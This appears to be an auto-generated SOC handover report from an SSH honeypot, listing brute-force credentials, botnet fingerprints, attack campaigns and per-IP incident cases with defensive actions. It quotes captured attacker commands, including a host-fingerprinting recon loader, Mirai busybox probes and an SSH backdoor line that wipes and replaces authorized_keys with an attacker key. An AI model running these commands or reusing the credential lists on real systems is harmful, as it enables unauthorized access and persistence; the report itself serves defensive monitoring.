# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-04 |
| **Generated At** | 2026-09-04T08:40:44Z |
| **Shift Time** | 08:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **244** |
| Confirmed Threats | **194** |
| False Positives Filtered | **50** (20.5%) |
| Unique Attacker IPs | **76** |
| Countries of Origin | **26** |
| High Severity Cases | **114** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **130** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **125** |
| Unique Credential Pairs | **103** |
| Unique Usernames | **16** |
| Unique Passwords | **97** |
| Successful Auth Pairs | **115** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 77 |
| `345gs5662d34` | 8 |
| `admin` | 8 |
| `user` | 7 |
| `support` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 7 |
| `support` | 7 |
| `abcd1234` | 4 |
| `admin` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `support` | `support` | 7 |
| `pi` | `abcd1234` | 4 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `default` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Pwd@CentOS` | `10.0.0.73` | 2026-09-04T02:55:56 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-04T02:55:59 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-04T02:55:59 |
| `root` | `default` | `83.237.72.18` | 2026-09-04T03:03:50 |
| `admin` | `admin111` | `217.60.255.130` | 2026-09-04T03:03:51 |
| `root` | `Ss123456` | `217.60.255.130` | 2026-09-04T03:04:22 |
| `user` | `qwerty` | `217.60.255.130` | 2026-09-04T03:13:26 |
| `support` | `support` | `176.53.159.196` | 2026-09-04T03:15:10 |
| `root` | `Fazel123` | `217.60.255.130` | 2026-09-04T03:15:11 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.38.79.11` | 2026-09-04T03:19:33 |
| `*1` | `$4` | `34.38.79.11` | 2026-09-04T03:19:46 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6660` | `34.38.79.11` | 2026-09-04T03:19:48 |
| `admin` | `root@123` | `217.60.255.130` | 2026-09-04T03:22:54 |
| `root` | `qwerty.123` | `217.60.255.130` | 2026-09-04T03:25:53 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-09-04T03:31:18 |
| `admin` | `test1234` | `217.60.255.130` | 2026-09-04T03:32:22 |
| `root` | `1234qwerQWER` | `217.60.255.130` | 2026-09-04T03:36:46 |
| `support` | `support` | `10.0.0.73` | 2026-09-04T03:39:50 |
| `user` | `Password123` | `217.60.255.130` | 2026-09-04T03:41:58 |
| `root` | `Root@123456` | `217.60.255.130` | 2026-09-04T03:47:30 |
| `debian` | `1qaz!@#$` | `217.60.255.130` | 2026-09-04T03:51:33 |
| `root` | `123@@@` | `144.22.238.238` | 2026-09-04T03:52:40 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-09-04T03:52:43 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-09-04T03:52:47 |
| `root` | `Aa123456.` | `217.60.255.130` | 2026-09-04T03:58:10 |
| `user` | `1q2w!Q@W` | `217.60.255.130` | 2026-09-04T04:00:49 |
| `user` | `Test123` | `220.250.52.89` | 2026-09-04T04:01:01 |
| `345gs5662d34` | `345gs5662d34` | `220.250.52.89` | 2026-09-04T04:01:05 |
| `root` | `!root` | `92.118.39.71` | 2026-09-04T04:04:20 |
| `root` | `111111` | `92.118.39.71` | 2026-09-04T04:06:23 |
| `sbserver` | `sbserver` | `103.157.149.14` | 2026-09-04T04:07:07 |
| `345gs5662d34` | `345gs5662d34` | `103.157.149.14` | 2026-09-04T04:07:11 |
| `sbserver` | `3245gs5662d34` | `103.157.149.14` | 2026-09-04T04:07:13 |
| `root` | `123123` | `92.118.39.71` | 2026-09-04T04:08:35 |
| `root` | `Qwerty123456` | `217.60.255.130` | 2026-09-04T04:09:04 |
| `cris` | `cris` | `5.182.83.231` | 2026-09-04T04:09:50 |
| `345gs5662d34` | `345gs5662d34` | `5.182.83.231` | 2026-09-04T04:09:53 |
| `cris` | `3245gs5662d34` | `5.182.83.231` | 2026-09-04T04:09:54 |
| `user` | `1234512345` | `217.60.255.130` | 2026-09-04T04:10:30 |
| `root` | `123321` | `92.118.39.71` | 2026-09-04T04:10:48 |
| `root` | `1234` | `92.118.39.71` | 2026-09-04T04:12:59 |
| `root` | `12345` | `92.118.39.71` | 2026-09-04T04:15:13 |
| `root` | `1234567` | `92.118.39.71` | 2026-09-04T04:19:23 |
| `root` | `Test123456` | `217.60.255.130` | 2026-09-04T04:19:51 |
| `test` | `user@2023` | `217.60.255.130` | 2026-09-04T04:20:02 |
| `root` | `12345678` | `92.118.39.71` | 2026-09-04T04:21:28 |
| `root` | `123456789` | `92.118.39.71` | 2026-09-04T04:23:28 |
| `root` | `1234567890` | `92.118.39.71` | 2026-09-04T04:25:38 |
| `root` | `123456a` | `92.118.39.71` | 2026-09-04T04:28:21 |
| `admin` | `@Admin1234` | `217.60.255.130` | 2026-09-04T04:29:25 |
| `root` | `Letmein123!` | `217.60.255.130` | 2026-09-04T04:30:27 |
| `root` | `123456b` | `92.118.39.71` | 2026-09-04T04:30:29 |
| `root` | `1234abcd` | `92.118.39.71` | 2026-09-04T04:32:38 |
| `root` | `123abc` | `92.118.39.71` | 2026-09-04T04:34:39 |
| `root` | `123qwe` | `92.118.39.71` | 2026-09-04T04:36:34 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-09-04T04:38:36 |
| `user` | `Password4321` | `217.60.255.130` | 2026-09-04T04:39:00 |
| `root` | `1qaz2wsx` | `92.118.39.71` | 2026-09-04T04:40:30 |
| `root` | `asdqwe123` | `217.60.255.130` | 2026-09-04T04:41:17 |
| `root` | `1qaz@WSX` | `92.118.39.71` | 2026-09-04T04:42:29 |
| `root` | `21` | `92.118.39.71` | 2026-09-04T04:44:23 |
| `root` | `manoj` | `152.32.90.8` | 2026-09-04T04:44:55 |
| `345gs5662d34` | `345gs5662d34` | `152.32.90.8` | 2026-09-04T04:44:59 |
| `root` | `3245gs5662d34` | `152.32.90.8` | 2026-09-04T04:45:00 |
| `root` | `321` | `92.118.39.71` | 2026-09-04T04:46:30 |
| `printer1` | `printer1@123` | `217.60.255.130` | 2026-09-04T04:48:33 |
| `root` | `4321` | `92.118.39.71` | 2026-09-04T04:48:37 |
| `admin` | `admin` | `104.155.46.74` | 2026-09-04T04:49:36 |
| `root` | `54321` | `92.118.39.71` | 2026-09-04T04:50:42 |
| `root` | `Aa111111` | `217.60.255.130` | 2026-09-04T04:51:53 |
| `root` | `555555` | `92.118.39.71` | 2026-09-04T04:52:50 |
| `root` | `654321` | `92.118.39.71` | 2026-09-04T04:55:04 |
| `root` | `7777777` | `92.118.39.71` | 2026-09-04T04:57:13 |
| `user` | `Password.123` | `217.60.255.130` | 2026-09-04T04:57:57 |
| `vps` | `vps1234` | `51.91.96.79` | 2026-09-04T04:58:01 |
| `345gs5662d34` | `345gs5662d34` | `51.91.96.79` | 2026-09-04T04:58:03 |
| `vps` | `3245gs5662d34` | `51.91.96.79` | 2026-09-04T04:58:04 |
| `mostafa` | `mostafa` | `129.121.33.174` | 2026-09-04T04:59:13 |
| `345gs5662d34` | `345gs5662d34` | `129.121.33.174` | 2026-09-04T04:59:16 |
| `mostafa` | `3245gs5662d34` | `129.121.33.174` | 2026-09-04T04:59:17 |
| `root` | `Admin2026!` | `92.118.39.71` | 2026-09-04T04:59:39 |
| `root` | `P4ssw0rd` | `92.118.39.71` | 2026-09-04T05:02:33 |
| `root` | `Qaz123456` | `217.60.255.130` | 2026-09-04T05:02:46 |
| `admin` | `admin1234567` | `4.240.96.30` | 2026-09-04T05:03:43 |
| `345gs5662d34` | `345gs5662d34` | `4.240.96.30` | 2026-09-04T05:03:48 |
| `admin` | `3245gs5662d34` | `4.240.96.30` | 2026-09-04T05:03:52 |
| `root` | `P4ssword` | `92.118.39.71` | 2026-09-04T05:05:28 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-09-04T05:07:35 |
| `root` | `P@ssw0rd2026` | `92.118.39.71` | 2026-09-04T05:09:37 |
| `root` | `P@ssword` | `92.118.39.71` | 2026-09-04T05:11:44 |
| `root` | `123456Ab` | `217.60.255.130` | 2026-09-04T05:13:43 |
| `root` | `Passw0rd` | `92.118.39.71` | 2026-09-04T05:13:46 |
| `root` | `Password1` | `92.118.39.71` | 2026-09-04T05:15:46 |
| `root` | `Root123` | `92.118.39.71` | 2026-09-04T05:17:44 |
| `root` | `abc123` | `92.118.39.71` | 2026-09-04T05:19:55 |
| `root` | `admin` | `92.118.39.71` | 2026-09-04T05:22:25 |
| `root` | `Abc12345678` | `217.60.255.130` | 2026-09-04T05:24:40 |
| `root` | `alpine` | `92.118.39.71` | 2026-09-04T05:25:24 |
| `root` | `changeme` | `92.118.39.71` | 2026-09-04T05:27:28 |
| `root` | `default` | `92.118.39.71` | 2026-09-04T05:29:24 |
| `root` | `letmein` | `92.118.39.71` | 2026-09-04T05:31:23 |
| `root` | `p4ssword` | `92.118.39.71` | 2026-09-04T05:33:27 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-09-04T05:35:31 |
| `root` | `Abcd.1234` | `217.60.255.130` | 2026-09-04T05:35:35 |
| `admin` | `admin` | `31.70.84.142` | 2026-09-04T05:42:42 |
| `root` | `Tt123456` | `217.60.255.130` | 2026-09-04T05:46:38 |
| `root` | `Hello.123` | `217.60.255.130` | 2026-09-04T05:57:39 |
| `root` | `Aa12345` | `217.60.255.130` | 2026-09-04T06:08:39 |
| `root` | `Qq123123` | `217.60.255.130` | 2026-09-04T06:19:40 |
| `root` | `Aa123654` | `217.60.255.130` | 2026-09-04T06:30:40 |
| `root` | `163.com` | `217.60.255.130` | 2026-09-04T06:41:42 |
| `root` | `123` | `195.178.110.232` | 2026-09-04T06:50:33 |
| `root` | `Qwer123456` | `217.60.255.130` | 2026-09-04T06:52:41 |
| `root` | `1234` | `195.178.110.232` | 2026-09-04T06:52:50 |
| `root` | `12345` | `195.178.110.232` | 2026-09-04T06:55:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **244** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 67 |
| libssh | 58 |
| OpenSSH | 6 |
| Paramiko (Python) | 4 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 46 | 2 |
| `419da4c91ddb...` | Modern SSH client | 35 | 1 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 46 | 2 | Mirai/variant |
| `419da4c91ddb...` | libssh | 35 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 14 | 7 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 44 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`, `92.118.39.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
/bin/busybox TOKEN
```
Source IPs: `83.237.72.18`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `5.182.83.231`, `220.250.52.89`, `51.91.96.79`, `152.32.90.8`, `129.121.33.174`, `4.240.96.30`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **76** |
| Unique ASNs | **45** |
| High-Risk ASNs | **32** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 20 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | LOW |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS135025` | Nexlogic Telecommunications Network, Inc. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (114)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c78e54bd2bc4

| Field | Detail |
|---|---|
| **Source IP** | `83.237.72[.]18` |
| **First Seen** | 2026-09-04 03:03 |
| **Last Seen** | 2026-09-04 03:04 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox TOKEN` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:03:48` | `cowrie.session.connect` |
| `2026-09-04 03:03:50` | `cowrie.login.success` |
| `2026-09-04 03:03:50` | `cowrie.session.params` |
| `2026-09-04 03:03:52` | `cowrie.command.input` |
| `2026-09-04 03:03:52` | `cowrie.command.failed` |
| `2026-09-04 03:03:53` | `cowrie.command.input` |
| `2026-09-04 03:03:53` | `cowrie.command.failed` |
| `2026-09-04 03:03:54` | `cowrie.command.input` |
| `2026-09-04 03:03:54` | `cowrie.command.failed` |
| `2026-09-04 03:03:54` | `cowrie.command.input` |
| `2026-09-04 03:03:55` | `cowrie.command.input` |
| `2026-09-04 03:03:55` | `cowrie.command.input` |
| `2026-09-04 03:03:55` | `cowrie.command.success` |
| `2026-09-04 03:04:05` | `cowrie.session.file_download.failed` |
| `2026-09-04 03:04:15` | `cowrie.session.file_download.failed` |
| `2026-09-04 03:04:55` | `cowrie.log.closed` |
| `2026-09-04 03:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.237.72[.]18` to AbuseIPDB if not already reported
- [ ] Block `83.237.72[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4257c59975ab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:03 |
| **Last Seen** | 2026-09-04 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:03:50` | `cowrie.session.connect` |
| `2026-09-04 03:03:50` | `cowrie.client.version` |
| `2026-09-04 03:03:50` | `cowrie.client.kex` |
| `2026-09-04 03:03:51` | `cowrie.login.success` |
| `2026-09-04 03:03:51` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:03:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:03:52` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89063aa2fd31

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:04 |
| **Last Seen** | 2026-09-04 03:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:04:21` | `cowrie.session.connect` |
| `2026-09-04 03:04:21` | `cowrie.client.version` |
| `2026-09-04 03:04:21` | `cowrie.client.kex` |
| `2026-09-04 03:04:22` | `cowrie.login.success` |
| `2026-09-04 03:04:22` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:04:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:04:23` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f29769a2895

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:13 |
| **Last Seen** | 2026-09-04 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:13:25` | `cowrie.session.connect` |
| `2026-09-04 03:13:25` | `cowrie.client.version` |
| `2026-09-04 03:13:25` | `cowrie.client.kex` |
| `2026-09-04 03:13:26` | `cowrie.login.success` |
| `2026-09-04 03:13:26` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:13:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:13:27` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85919d9790ed

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 03:15 |
| **Last Seen** | 2026-09-04 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:15:09` | `cowrie.session.connect` |
| `2026-09-04 03:15:09` | `cowrie.client.version` |
| `2026-09-04 03:15:09` | `cowrie.client.kex` |
| `2026-09-04 03:15:10` | `cowrie.login.success` |
| `2026-09-04 03:15:10` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:15:10` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc0398d4720

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:15 |
| **Last Seen** | 2026-09-04 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:15:10` | `cowrie.session.connect` |
| `2026-09-04 03:15:10` | `cowrie.client.version` |
| `2026-09-04 03:15:10` | `cowrie.client.kex` |
| `2026-09-04 03:15:11` | `cowrie.login.success` |
| `2026-09-04 03:15:11` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:15:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:15:11` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d727bdf339ba

| Field | Detail |
|---|---|
| **Source IP** | `34.38.79[.]11` |
| **First Seen** | 2026-09-04 03:19 |
| **Last Seen** | 2026-09-04 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:19:33` | `cowrie.session.connect` |
| `2026-09-04 03:19:33` | `cowrie.login.success` |
| `2026-09-04 03:19:33` | `cowrie.session.params` |
| `2026-09-04 03:19:33` | `cowrie.command.input` |
| `2026-09-04 03:19:33` | `cowrie.command.input` |
| `2026-09-04 03:19:33` | `cowrie.command.failed` |
| `2026-09-04 03:19:33` | `cowrie.command.input` |
| `2026-09-04 03:19:33` | `cowrie.log.closed` |
| `2026-09-04 03:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.79[.]11` to AbuseIPDB if not already reported
- [ ] Block `34.38.79[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6fe66ecf014

| Field | Detail |
|---|---|
| **Source IP** | `34.38.79[.]11` |
| **First Seen** | 2026-09-04 03:19 |
| **Last Seen** | 2026-09-04 03:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:19:46` | `cowrie.session.connect` |
| `2026-09-04 03:19:46` | `cowrie.login.success` |
| `2026-09-04 03:19:47` | `cowrie.session.params` |
| `2026-09-04 03:19:47` | `cowrie.command.input` |
| `2026-09-04 03:19:47` | `cowrie.command.failed` |
| `2026-09-04 03:19:59` | `cowrie.log.closed` |
| `2026-09-04 03:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.79[.]11` to AbuseIPDB if not already reported
- [ ] Block `34.38.79[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db75ebd0c7f7

| Field | Detail |
|---|---|
| **Source IP** | `34.38.79[.]11` |
| **First Seen** | 2026-09-04 03:19 |
| **Last Seen** | 2026-09-04 03:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:19:48` | `cowrie.session.connect` |
| `2026-09-04 03:19:48` | `cowrie.login.success` |
| `2026-09-04 03:19:49` | `cowrie.session.params` |
| `2026-09-04 03:19:49` | `cowrie.command.input` |
| `2026-09-04 03:19:59` | `cowrie.log.closed` |
| `2026-09-04 03:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.79[.]11` to AbuseIPDB if not already reported
- [ ] Block `34.38.79[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76df592b6247

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:22 |
| **Last Seen** | 2026-09-04 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:22:53` | `cowrie.session.connect` |
| `2026-09-04 03:22:53` | `cowrie.client.version` |
| `2026-09-04 03:22:53` | `cowrie.client.kex` |
| `2026-09-04 03:22:54` | `cowrie.login.success` |
| `2026-09-04 03:22:54` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:22:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:22:54` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707b19c4a746

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:25 |
| **Last Seen** | 2026-09-04 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:25:52` | `cowrie.session.connect` |
| `2026-09-04 03:25:52` | `cowrie.client.version` |
| `2026-09-04 03:25:52` | `cowrie.client.kex` |
| `2026-09-04 03:25:53` | `cowrie.login.success` |
| `2026-09-04 03:25:53` | `cowrie.direct-tcpip.request` |
